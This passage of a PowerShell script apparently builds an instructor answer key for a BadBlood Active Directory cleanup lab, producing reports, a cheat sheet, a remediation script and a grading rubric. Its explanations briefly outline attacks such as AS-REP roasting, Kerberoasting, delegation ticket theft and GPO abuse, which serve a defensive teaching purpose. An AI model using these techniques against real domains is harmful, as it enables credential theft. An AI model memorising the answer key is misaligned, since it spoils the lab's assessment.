# Privileged Group Membership Detail
$reportLines.Add("")
$reportLines.Add("=" * 80)
$reportLines.Add("  PRIVILEGED GROUP MEMBERSHIP - COMPLETE PICTURE")
$reportLines.Add("=" * 80)

foreach ($groupName in $PrivilegedGroups) {
    $groupEntries = $PrivGroupReport | Where-Object { $_.PrivilegedGroup -eq $groupName }
    if ($groupEntries.Count -eq 0) { continue }
    
    $gi = $GroupRiskExplanations[$groupName]
    
    $reportLines.Add("")
    $reportLines.Add("GROUP: $groupName")
    if ($gi) {
        $reportLines.Add("  RISK: $($gi.Risk)")
        $reportLines.Add("  WHY:  $($gi.Why)")
    }
    $reportLines.Add("-" * 60)
    $reportLines.Add("  Current Members -> Action Required:")
    
    foreach ($entry in ($groupEntries | Sort-Object Action)) {
        $marker = if ($entry.Action -eq "KEEP") { "[OK]    " } else { "[REMOVE]" }
        $bb = if ($entry.IsBadBloodCreated) { " (BadBlood)" } else { "" }
        $deptInfo = if ($entry.Department) { " | Dept: $($entry.Department)" } else { "" }
        $ouInfo = if ($entry.OUPath) { " | OU: $($entry.OUPath)" } else { "" }
        $reportLines.Add("    $marker $($entry.MemberName)$bb ($($entry.MemberType))$deptInfo$ouInfo")
    }
    
    $removeCount = ($groupEntries | Where-Object { $_.Action -eq "REMOVE" }).Count
    $reportLines.Add("  -> $removeCount member(s) should be REMOVED")
    if ($gi) {
        $reportLines.Add("  -> CLEAN STATE: $($gi.Principle)")
    }
}

# Write the Clean State Summary
$reportLines.Add("")
$reportLines.Add("=" * 80)
$reportLines.Add("  EXPECTED CLEAN STATE SUMMARY")
$reportLines.Add("=" * 80)
$reportLines.Add("")
$reportLines.Add("When students are done, the domain should look like this:")
$reportLines.Add("")
$reportLines.Add("1. PRIVILEGED GROUPS:")
$reportLines.Add("   - Domain Admins: Only 'Administrator' account")
$reportLines.Add("   - Enterprise Admins: Only 'Administrator' account")
$reportLines.Add("   - Schema Admins: Only 'Administrator' account (or empty)")
$reportLines.Add("   - All other privileged groups: Only legitimate built-in members")
$reportLines.Add("   - NO BadBlood-created users or groups nested in any privileged group")
$reportLines.Add("")
$reportLines.Add("2. USER ACCOUNTS:")
$reportLines.Add("   - No accounts with 'Password Not Required' flag")
$reportLines.Add("   - No accounts with 'Do Not Require Kerberos Pre-Auth' (AS-REP)")
$reportLines.Add("   - No user accounts with unconstrained delegation")
$reportLines.Add("   - No user accounts with SPNs (or converted to gMSA)")
$reportLines.Add("   - No reversible password encryption")
$reportLines.Add("   - All stale AdminCount flags cleared and inheritance restored")
$reportLines.Add("   - No SID History entries on BadBlood accounts")
$reportLines.Add("")
$reportLines.Add("3. OU STRUCTURE:")
$reportLines.Add("   - Users in People/<Dept> OUs should NOT have privileged access")
$reportLines.Add("   - Admin Tier OUs should contain only accounts appropriate for that tier")
$reportLines.Add("   - Staging/Testing OUs should be reviewed and cleaned")
$reportLines.Add("")
$reportLines.Add("4. ACLs:")
$reportLines.Add("   - No BadBlood users/groups with GenericAll/WriteDacl/WriteOwner on OUs")
$reportLines.Add("   - No BadBlood objects with permissions on AdminSDHolder")
$reportLines.Add("   - No BadBlood objects with permissions on the domain root")
$reportLines.Add("")
$reportLines.Add("5. COMPUTER OBJECTS:")
$reportLines.Add("   - No non-DC computers with unconstrained delegation")
$reportLines.Add("")

# Save the report
$reportFile = Join-Path $OutputPath "AnswerKey_MasterReport.txt"
$reportLines | Out-File -FilePath $reportFile -Encoding UTF8
Write-Status "Master report saved: $reportFile" "Green"

# --- PRIVILEGED GROUP REPORT (CSV) ---
$privFile = Join-Path $OutputPath "PrivilegedGroupMembers.csv"
$PrivGroupReport | Export-Csv -Path $privFile -NoTypeInformation
Write-Status "Privileged group report saved: $privFile" "Green"

# --- ALL FINDINGS (CSV) ---
$findingsFile = Join-Path $OutputPath "AllFindings.csv"
$AllFindings | Export-Csv -Path $findingsFile -NoTypeInformation
Write-Status "All findings CSV saved: $findingsFile" "Green"

# --- QUICK REFERENCE CHEAT SHEET (v2 - WITH EXPLANATIONS) ---
$cheatSheet = Join-Path $OutputPath "QuickReference_CheatSheet.txt"
$cheatLines = [System.Collections.Generic.List[string]]::new()

$cheatLines.Add("=" * 90)
$cheatLines.Add("  QUICK REFERENCE - WHAT STUDENTS MUST FIX (WITH EXPLANATIONS)")
$cheatLines.Add("  Domain: $DomainName | Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
$cheatLines.Add("  (Give this to TAs or use for spot-checking)")
$cheatLines.Add("=" * 90)
$cheatLines.Add("")

# Category-level explanations for the header of each section
$CategoryExplanations = @{
    "Privileged Group Membership" = @(
        "WHY THIS MATTERS: Users in privileged groups have elevated domain permissions."
        "BadBlood randomly placed users into admin groups they should never be in."
        "Each group has specific dangers - see individual findings below."
    )
    "Kerberos Security" = @(
        "WHY THIS MATTERS: These settings allow offline password cracking attacks."
        "AS-REP Roasting (DoesNotRequirePreAuth): ANYONE can request an encrypted ticket"
        "  and crack it offline - NO credentials needed to start the attack."
        "Kerberoasting (SPNs on users): Any domain user can request a service ticket"
        "  and crack the user's password offline at billions of attempts per second."
    )
    "Account Settings" = @(
        "WHY THIS MATTERS: Dangerous flags on user accounts that weaken security."
        "Includes: blank passwords allowed, passwords that never expire,"
        "reversible encryption (plaintext equivalent), and stale AdminCount flags."
    )
    "Dangerous ACL" = @(
        "WHY THIS MATTERS: BadBlood granted random users/groups permissions on critical"
        "AD objects. These ACLs let non-admins modify objects they shouldn't touch."
        "Permissions on AdminSDHolder are especially dangerous - they get copied to"
        "ALL protected accounts every 60 minutes by the SDProp process."
    )
    "Delegation" = @(
        "WHY THIS MATTERS: Delegation settings allow credential theft and impersonation."
        "Unconstrained delegation caches full TGTs - if an admin authenticates,"
        "their ticket can be stolen. Only DCs should have unconstrained delegation."
    )
    "OU Misplacement" = @(
        "WHY THIS MATTERS: Users are in the wrong OUs, violating the tiered admin model."
        "'Shadow Admins' = regular employees with secret admin rights (easy phishing targets)."
        "'Misplaced accounts' = accounts in admin OUs with no actual admin rights."
    )
    "Nested Group Membership" = @(
        "WHY THIS MATTERS: Groups nested inside privileged groups silently grant all"
        "members inherited privileges. Common backdoor technique - less visible than"
        "direct membership. Use Get-ADGroupMember -Recursive to catch these."
    )
    "SID History" = @(
        "WHY THIS MATTERS: SID History can contain privileged SIDs that grant hidden"
        "access invisible to standard group membership queries."
    )
    "GPO Permissions" = @(
        "WHY THIS MATTERS: GPO edit access = remote code execution on all machines"
        "the GPO applies to. An attacker can deploy malware domain-wide within 90 min."
    )
}

# Group findings by category, ordered by importance
$cheatCategories = $AllFindings | Group-Object Category | Sort-Object {
    switch ($_.Name) {
        "Privileged Group Membership" { 0 }
        "Dangerous ACL"               { 1 }
        "Delegation"                  { 2 }
        "Kerberos Security"           { 3 }
        "OU Misplacement"             { 4 }
        "Nested Group Membership"     { 5 }
        "Account Settings"            { 6 }
        "SID History"                 { 7 }
        "GPO Permissions"             { 8 }
        default                       { 9 }
    }
}

foreach ($catGroup in $cheatCategories) {
    $catFindings = $catGroup.Group | Sort-Object Severity
    $catCrit = @($catFindings | Where-Object { $_.Severity -eq "CRITICAL" }).Count
    $catHigh = @($catFindings | Where-Object { $_.Severity -eq "HIGH" }).Count
    $catMed  = @($catFindings | Where-Object { $_.Severity -eq "MEDIUM" }).Count

    $cheatLines.Add("=" * 90)
    $cheatLines.Add("CATEGORY: $($catGroup.Name) ($($catGroup.Count) findings: $catCrit CRITICAL, $catHigh HIGH, $catMed MEDIUM)")
    $cheatLines.Add("=" * 90)

    # Print category-level explanation
    $catExpl = $CategoryExplanations[$catGroup.Name]
    if ($catExpl) {
        foreach ($line in $catExpl) { $cheatLines.Add($line) }
    }
    $cheatLines.Add("")

    $itemNum = 0
    foreach ($sevLevel in @("CRITICAL", "HIGH", "MEDIUM", "LOW")) {
        $sevFindings = @($catFindings | Where-Object { $_.Severity -eq $sevLevel })
        if ($sevFindings.Count -eq 0) { continue }

        $cheatLines.Add("  --- $sevLevel ($($sevFindings.Count)) ---")
        foreach ($f in $sevFindings) {
            $itemNum++
            $cheatLines.Add("  $itemNum. [$sevLevel] $($f.Finding)")
            $cheatLines.Add("     FIX: $($f.ExpectedState)")
            if ($f.WhyBad) {
                # Truncate to ~2 sentences for cheat sheet brevity
                $whyShort = ($f.WhyBad -split '\.' | Select-Object -First 2) -join '.'
                if ($whyShort.Length -gt 200) { $whyShort = $whyShort.Substring(0, 197) + "..." }
                $cheatLines.Add("     WHY: $whyShort.")
            }
            if ($f.UserContext) {
                $ctxShort = ($f.UserContext -split '\.' | Select-Object -First 1)
                if ($ctxShort.Length -gt 150) { $ctxShort = $ctxShort.Substring(0, 147) + "..." }
                $cheatLines.Add("     WHO: $ctxShort.")
            }
            if ($f.AttackScenario) {
                $atkShort = ($f.AttackScenario -split '\.' | Select-Object -First 1)
                if ($atkShort.Length -gt 150) { $atkShort = $atkShort.Substring(0, 147) + "..." }
                $cheatLines.Add("     ATTACK: $atkShort.")
            }
            $cheatLines.Add("")
        }
    }
}

$cheatLines | Out-File -FilePath $cheatSheet -Encoding UTF8
Write-Status "Cheat sheet saved: $cheatSheet" "Green"

# --- REMEDIATION SCRIPT (PS1) ---
$remFile = Join-Path $OutputPath "Remediation_Script.ps1"
$remLines = [System.Collections.Generic.List[string]]::new()

$remLines.Add("#Requires -Modules ActiveDirectory")
$remLines.Add("<#")
$remLines.Add(".SYNOPSIS")
$remLines.Add("    Auto-generated remediation script for BadBlood domain cleanup.")
$remLines.Add("    THIS IS THE ANSWER KEY - DO NOT GIVE TO STUDENTS.")
$remLines.Add("    Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
$remLines.Add(".DESCRIPTION")
$remLines.Add("    Running this script will fix all findings automatically.")
$remLines.Add("    Use -WhatIf to preview changes without applying them.")
$remLines.Add("#>")
$remLines.Add("[CmdletBinding(SupportsShouldProcess)]")
$remLines.Add("param()")
$remLines.Add("")
$remLines.Add('Write-Host "=== BadBlood Remediation Script ===" -ForegroundColor Yellow')
$remLines.Add('Write-Host "This will fix all identified issues. Use -WhatIf to preview." -ForegroundColor Cyan')
$remLines.Add("")

# Privileged group removal commands
$remLines.Add("# --- REMOVE UNAUTHORIZED PRIVILEGED GROUP MEMBERS ---")
$removals = $PrivGroupReport | Where-Object { $_.Action -eq "REMOVE" }
foreach ($r in $removals) {
    $remLines.Add("Write-Host 'Removing $($r.MemberName) from $($r.PrivilegedGroup)...' -ForegroundColor Yellow")
    $remLines.Add("Remove-ADGroupMember -Identity '$($r.PrivilegedGroup)' -Members '$($r.MemberName)' -Confirm:`$false -ErrorAction SilentlyContinue")
}

$remLines.Add("")
$remLines.Add("# --- FIX DANGEROUS ACCOUNT SETTINGS ---")

foreach ($user in $BadBloodUsers) {
    $fixes = @()
    if ($user.PasswordNeverExpires)                  { $fixes += "PasswordNeverExpires = `$false" }
    if ($user.PasswordNotRequired)                   { $fixes += "PasswordNotRequired = `$false" }
    if ($user.DoesNotRequirePreAuth)                  { $fixes += "DoesNotRequirePreAuth = `$false" }
    if ($user.TrustedForDelegation)                   { $fixes += "TrustedForDelegation = `$false" }
    if ($user.TrustedToAuthForDelegation)             { $fixes += "TrustedToAuthForDelegation = `$false" }
    if ($user.AllowReversiblePasswordEncryption)      { $fixes += "AllowReversiblePasswordEncryption = `$false" }
    
    if ($fixes.Count -gt 0) {
        $setParams = $fixes -join "; "
        $remLines.Add("# Fix: $($user.SamAccountName)")
        foreach ($fix in $fixes) {
            $prop = ($fix -split " = ")[0].Trim()
            $val = ($fix -split " = ")[1].Trim()
            $remLines.Add("Set-ADUser -Identity '$($user.SamAccountName)' -$prop $val -ErrorAction SilentlyContinue")
        }
    }
    
    # Clear SPNs
    if ($user.ServicePrincipalName.Count -gt 0) {
        $remLines.Add("# Remove SPNs from $($user.SamAccountName)")
        foreach ($spn in $user.ServicePrincipalName) {
            $remLines.Add("Set-ADUser -Identity '$($user.SamAccountName)' -ServicePrincipalNames @{Remove='$spn'} -ErrorAction SilentlyContinue")
        }
    }
    
    # Clear AdminCount
    if ($user.AdminCount -eq 1) {
        $remLines.Add("# Clear stale AdminCount on $($user.SamAccountName)")
        $remLines.Add("Set-ADObject -Identity '$($user.DistinguishedName)' -Clear AdminCount -ErrorAction SilentlyContinue")
    }
}

$remLines.Add("")
$remLines.Add("# --- FIX COMPUTER DELEGATION ---")
foreach ($comp in $Computers) {
    if ($comp.TrustedForDelegation -and $comp.Name -notlike "*DC*") {
        $remLines.Add("Set-ADComputer -Identity '$($comp.Name)' -TrustedForDelegation `$false -ErrorAction SilentlyContinue")
    }
}

$remLines.Add("")
$remLines.Add('Write-Host "`n=== Remediation Complete ===" -ForegroundColor Green')
$remLines.Add('Write-Host "Re-run the Answer Key Generator to verify all issues are resolved." -ForegroundColor Cyan')

$remLines | Out-File -FilePath $remFile -Encoding UTF8
Write-Status "Remediation script saved: $remFile" "Green"

# --- GRADING RUBRIC ---
$rubricFile = Join-Path $OutputPath "GradingRubric.txt"
$rubricLines = @(
    "=" * 60
    "  SUGGESTED GRADING RUBRIC"
    "  Total Possible Points: 100"
    "=" * 60
    ""
    "CRITICAL findings ($critical total) - 5 points each"
    "  Max points: $($critical * 5)"
    "  These are actively exploitable vulnerabilities."
    ""
    "HIGH findings ($high total) - 3 points each"
    "  Max points: $($high * 3)"
    "  These represent significant security risks."
    ""
    "MEDIUM findings ($medium total) - 1 point each"
    "  Max points: $($medium * 1)"
    "  These are best-practice violations."
    ""
    "BONUS: Documenting findings in a report (+10)"
    "BONUS: Identifying issues not in this answer key (+5 each)"
    ""
    "SUGGESTED GRADE SCALE:"
    "  A  = 90%+ of available points"
    "  B  = 80-89%"
    "  C  = 70-79%"
    "  D  = 60-69%"
    "  F  = Below 60%"
    ""
    "Total available: $($critical * 5 + $high * 3 + $medium * 1) points"
    "(Scale to 100 by dividing student score by total and multiplying by 100)"
)
$rubricLines | Out-File -FilePath $rubricFile -Encoding UTF8
Write-Status "Grading rubric saved: $rubricFile" "Green"

if ($ExportCSVs) {
    # Export user inventory
    $BadBloodUsers | Select-Object SamAccountName, Enabled, CanonicalName, Description,
        PasswordNeverExpires, PasswordNotRequired, DoesNotRequirePreAuth,
        TrustedForDelegation, TrustedToAuthForDelegation, AdminCount,
        @{N='SPNs';E={$_.ServicePrincipalName -join '; '}},
        @{N='SIDHistoryCount';E={$_.SIDHistory.Count}},
        @{N='MemberOfCount';E={$_.MemberOf.Count}} |
        Export-Csv (Join-Path $OutputPath "BadBloodUsers_Inventory.csv") -NoTypeInformation
    
    $BadBloodGroups | Select-Object SamAccountName, Description,
        @{N='MemberCount';E={$_.Members.Count}},
        @{N='MemberOfCount';E={$_.MemberOf.Count}} |
        Export-Csv (Join-Path $OutputPath "BadBloodGroups_Inventory.csv") -NoTypeInformation
    
    Write-Status "CSV inventories exported." "Green"
}

# ============================================================================
# FINAL SUMMARY
# ============================================================================

Write-Host ""
Write-Host "=" * 80 -ForegroundColor Yellow
Write-Host "  ANSWER KEY GENERATION COMPLETE" -ForegroundColor Green
Write-Host "=" * 80 -ForegroundColor Yellow
Write-Host ""
Write-Host "  Domain:     $DomainName" -ForegroundColor White
Write-Host "  BB Users:   $($BadBloodUsers.Count)" -ForegroundColor White
Write-Host "  BB Groups:  $($BadBloodGroups.Count)" -ForegroundColor White
Write-Host ""
Write-Host "  FINDINGS:" -ForegroundColor White
Write-Host "    CRITICAL: $critical" -ForegroundColor Red
Write-Host "    HIGH:     $high" -ForegroundColor DarkYellow
Write-Host "    MEDIUM:   $medium" -ForegroundColor Yellow
Write-Host "    LOW:      $low" -ForegroundColor Cyan
Write-Host "    INFO:     $info" -ForegroundColor Gray
Write-Host "    TOTAL:    $($AllFindings.Count)" -ForegroundColor White
Write-Host ""
Write-Host "  OUTPUT FILES:" -ForegroundColor White
Write-Host "    $reportFile" -ForegroundColor Gray
Write-Host "    $privFile" -ForegroundColor Gray
Write-Host "    $findingsFile" -ForegroundColor Gray
Write-Host "    $cheatSheet" -ForegroundColor Gray
Write-Host "    $remFile" -ForegroundColor Gray
Write-Host "    $rubricFile" -ForegroundColor Gray
Write-Host ""
Write-Host "  TIP: Run the Remediation_Script.ps1 with -WhatIf first!" -ForegroundColor Cyan
Write-Host "=" * 80 -ForegroundColor Yellow